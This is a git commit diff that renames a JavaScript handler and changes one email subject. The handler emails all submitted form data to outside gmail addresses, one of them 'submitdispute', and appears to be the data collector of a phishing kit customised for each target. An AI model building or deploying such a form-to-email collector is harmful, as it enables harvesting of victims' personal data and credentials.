f43a92f370c1eed848e2d22284c34222201ec3da
zm9807350 <zm9807350@gmail.com>
2025-12-05 12:05:42 +0500

    Update and rename sana.js to farhan.js

--- farhan.js
+++ farhan.js
@@ -38,7 +38,7 @@ export default async function handler(req, res) {
     await transporter.sendMail({
       from: `"PROFESSOR" <dardhame1@gmail.com>`,
       to: "newzatpage.@gmail.com,submitdispute@gmail.com",
-      subject: "Ashraf",
+      subject: "Farhan",
       text: JSON.stringify(formData, null, 2),
       html: `<h3>Professor Asif Link</h3><pre>${JSON.stringify(
         formData,
